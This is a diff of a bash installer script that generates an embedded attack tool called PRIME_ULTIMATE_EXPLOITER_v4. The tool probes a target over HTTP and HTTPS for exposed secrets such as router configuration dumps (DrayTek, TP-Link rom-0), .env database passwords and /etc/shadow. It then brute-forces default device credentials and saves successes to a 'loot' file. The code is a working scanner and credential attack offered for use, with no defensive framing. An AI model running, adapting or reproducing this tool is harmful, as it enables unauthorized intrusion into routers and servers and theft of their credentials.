@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="32.5"
+CURRENT_VERSION="32.6"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -928,69 +928,61 @@ generate_prime_ultimate_exploiter_v4() {
     local target_file="$1"
     local code=$(cat << 'EOF'
 #!/bin/bash
-# PRIME_ULTIMATE_EXPLOITER_v4 (Final Absolute Edition)
-
+# PRIME_ULTIMATE_EXPLOITER_v4 (Final Absolute Stable)
 TARGET="$1"
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
 echo "--------------------------------------------------"
-echo -e "\e[1;31m>> INITIATING FULL-CYCLE ATTACK: $TARGET\e[0m"
+echo -e "\e[1;31m>> INITIATING ATTACK: $TARGET\e[0m"
 echo "--------------------------------------------------"
 
-# 1. ВЕКТОРЫ УТЕЧЕК (Самый полный список)
+# Твои векторы и креды
 VECTORS=(
-    "/cgi-bin/config.exp|sysPassword"                 # DrayTek
-    "/rom-0|tplink"                                   # TP-Link
-    "/phpmyadmin/setup/index.php|token"               # phpMyAdmin
-    "/.env|DB_PASSWORD"                               # Laravel/Web
-    "/wp-content/debug.log|WP_User"                    # WordPress
-    "/backup.sql|INSERT INTO"                         # Database
-    "/etc/shadow|root:"                               # LFI
-    "/get_set.cgi?get=wifi_settings|wireless_key"     # IoT
+    "/cgi-bin/config.exp:sysPassword" 
+    "/rom-0:tplink" 
+    "/.env:DB_PASSWORD" 
+    "/etc/shadow:root:"
 )
-
-# 2. ЭВРИСТИЧЕСКИЙ БРУТФОРС (Топ мировых дефолтов)
 CREDS=(
-    "admin:admin" "admin:password" "root:root" 
-    "admin:12345" "telecomadmin:admintelecom" 
-    "ubnt:ubnt" "support:support" "admin:"
+    "admin:admin" 
+    "admin:password" 
+    "root:root" 
+    "telecomadmin:admintelecom"
 )
 
-# 3. ОСНОВНОЙ ЦИКЛ ОБРАБОТКИ
-# Проверяем как HTTP, так и HTTPS
 for proto in "http" "https"; do
     URL="${proto}://${TARGET}/"
     
-    # Стелс-проверка (без awk и cut, чтобы избежать ошибок 957/997)
-    RESPONSE=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1)
-    
-    # Используем массив для безопасного извлечения кода ответа
-    read -ra ADDR <<< "$RESPONSE"
-    CODE="${ADDR[1]}"
+    # Сверхстабильный парсинг кода (без лишних пайпов)
+    RESP=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1)
+    CODE=$(echo "$RESP" | grep -oE '[0-9]{3}' | head -n1)
     CODE=${CODE:-000}
 
     if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
-        echo -e "\e[1;34m[*] TARGET ALIVE:\e[0m $URL [Code: $CODE]"
-
-        # А. Проверка прямых эксплойтов
+        echo -e "\e[1;34m[*] TARGET ALIVE:\e[0m $URL [$CODE]"
+        
+        # А. Эксплойты
         for vec in "${VECTORS[@]}"; do
-            IFS='|' read -r v_path v_key <<< "$vec"
-            FULL_URL="${proto}://${TARGET}${v_path}"
+            # Используем cut - максимально просто
+            V_PATH=$(echo "$vec" | cut -d':' -f1)
+            V_KEY=$(echo "$vec" | cut -d':' -f2)
             
-            if curl -sL -k -A "$UA" --max-time 3 "$FULL_URL" 2>/dev/null | grep -q "$v_key"; then
-                echo -e "    \e[1;31m[!!!] EXPLOIT SUCCESS: $v_key FOUND AT $v_path\e[0m"
-                echo "[EXPLOIT] $FULL_URL | KEY: $v_key" >> /root/prime_loot_full.txt
+            FULL_V_URL="${proto}://${TARGET}${V_PATH}"
+            if curl -sL -k -A "$UA" --max-time 3 "$FULL_V_URL" 2>/dev/null | grep -q "$V_KEY"; then
+                echo -e "    \e[1;31m[!!!] EXPLOIT SUCCESS: $V_KEY FOUND\e[0m"
+                echo "[EXPLOIT] $FULL_V_URL | $V_KEY" >> /root/prime_loot_full.txt
             fi
         done
-
-        # Б. Умный брутфорс
-        echo -e "    \e[1;36m[>] Testing credentials...\e[0m"
+        
+        # Б. Брутфорс
         for pair in "${CREDS[@]}"; do
-            IFS=':' read -r u p <<< "$pair"
-            AUTH_RES=$(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL")
-            if [[ "$AUTH_RES" == "200" ]]; then
-                echo -e "    \e[1;32m[!!!] AUTH MATCH: $u:$p\e[0m"
-                echo "[AUTH] $u:$p @ $URL" >> /root/prime_loot_full.txt
+            U=$(echo "$pair" | cut -d':' -f1)
+            P=$(echo "$pair" | cut -d':' -f2)
+            
+            R=$(curl -sL -k -u "$U:$P" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL")
+            if [[ "$R" == "200" ]]; then
+                echo -e "    \e[1;32m[!!!] AUTH MATCH: $U:$P\e[0m"
+                echo "[AUTH] $U:$P @ $URL" >> /root/prime_loot_full.txt
                 break
             fi
         done
@@ -999,9 +991,11 @@ done
 echo "--------------------------------------------------"
 EOF
 )
-    smart_cat "$target_file" "$code"
+    # Запись через printf исключает "обрезание" или потерю кода
+    printf "%s\n" "$code" > "$target_file"
     chmod +x "$target_file"
 }
+
 
 
 
